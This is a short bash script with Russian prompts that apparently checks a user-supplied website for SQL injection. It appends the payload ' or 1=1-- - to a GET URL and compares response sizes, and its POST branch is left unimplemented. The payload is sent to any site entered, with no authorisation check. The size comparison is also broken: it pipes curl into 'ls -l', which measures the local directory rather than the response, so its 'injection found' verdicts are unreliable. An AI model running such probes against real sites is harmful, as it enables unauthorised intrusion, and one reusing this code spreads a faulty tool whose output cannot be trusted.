#!/usr/bin/env bash

while true; do
    echo "Запрос GET или POST?"
    echo "1. GET"
    echo "2. POST"
    read request
    
    if [[ $request == "1" ]]; then
        # Запрашиваем место, куда применять проверку
        read -p "Укажите адрес, где проверять наличие инъекции: " url_place
        # Проверяем заголовки и размеры страниц в ответе сайта
        res1=$(curl -I $url_place | grep HTTP | grep -c "OK")
        if [[ $res1 -eq 1 ]]; then
            size_res1=$(curl -I $url_place | ls -l | awk '{print $5}')
        else
            echo "Сайт недоступен"
            sleep 1
            continue
        fi
        res2=$(curl -I "$url_place"\'+or+1=1\--+- | grep HTTP | grep -c "OK")
        if [[ $res2 -eq 1 ]]; then
            size_res2=$(curl -I "$url_place"\'+or+1=1\--+-| ls -l | awk '{print $5}')
        else
            echo "Сайт падает при инъекции"
            sleep 1
            continue
        fi
        if [[ $size_res1 -lt $size_res2 ]]; then
            echo "Инъекция есть"
        else
            echo "Инъекции нет"
        fi
    elif [[ $request == "2" ]]; then
        echo "В процессе разработки"
        # read -p "Укажите адрес, где проверять наличие инъекции: " url_place
    fi
done